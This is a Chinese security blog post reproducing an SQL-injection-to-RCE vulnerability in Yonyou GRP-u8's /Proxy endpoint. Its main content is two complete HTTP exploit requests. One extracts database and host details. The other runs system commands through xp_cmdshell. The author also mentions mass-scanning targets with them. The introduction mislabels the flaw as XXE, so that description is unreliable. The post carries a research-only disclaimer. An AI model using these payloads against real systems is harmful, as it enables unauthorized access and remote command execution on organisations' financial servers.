> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/qohRHQj3pS1BTRv341tS9g)

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjcSQn373grjydSAvWcmAgI3MypEpP1VictwEP5nnfiaroylED70CH67ib3AOHMoibP5uwDnicdSCNX9Eaw/640?wx_fmt=jpeg)

用友 GRP-u8 注入 - RCE 漏洞复现

一、漏洞简介

用友 GRP-u8 存在 XXE 漏洞，该漏洞源于应用程序解析 XML 输入时没有进制外部实体的加载，导致可加载恶意外部文件。

二、漏洞复现

SQL 注入 POC  

```
POST /Proxy HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=25EDA97813692F4D1FAFBB74FD7CFFE0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 371

cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">select user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

验证过程  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3Jj3hQ5GQQg2R5XCv5j4WkLz2QPia2CoFQlOzBAMykYX5UZqic3pNymlA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI38UlYCnYOJU6Umtd3o4iauMb9bOrTSA84audEfHgaia5icyt1Sa9XeEXSQ/640?wx_fmt=png)

批量跑了一部分（这个是 HW 期间第一时间跑的）现在估计没啥了  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3IOicD965VsbHs2coKKY8KuRic8bNn6O7I6c6QsbHcZFOVoPicdsysggIQ/640?wx_fmt=png)

Rce 注入 EXP  

```
POST /Proxy HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=25EDA97813692F4D1FAFBB74FD7CFFE0
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 355

cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell 'ipconfig'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3tZOkZNv2g8eeEjaFliaLnekZwRMTLfb8pDhGmCzm2stWEMwtZPEqmVA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3LibfCB23cLIydNYFACOZz1iaTUeEV7ofvXH9ZH7Y4bkKeGZmsQD0buQw/640?wx_fmt=png)

参考：  

https://www.cnblogs.com/0day-li/p/13652897.html

https://www.uedbox.com/post/14953/

https://www.cnblogs.com/Yang34/p/13653960.html

注意：⚠️  

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

如果本文内容侵权或者对贵公司业务或者其他有影响，请联系作者删除。  

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

公众号

```
个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns
个人简书：https://www.jianshu.com/u/bf0e38a8d400
个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html
个人博客园：https://www.cnblogs.com/thelostworld/
FREEBUF主页：https://www.freebuf.com/author/thelostworld?type=article
语雀博客主页：https://www.yuque.com/thelostworld
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)

欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)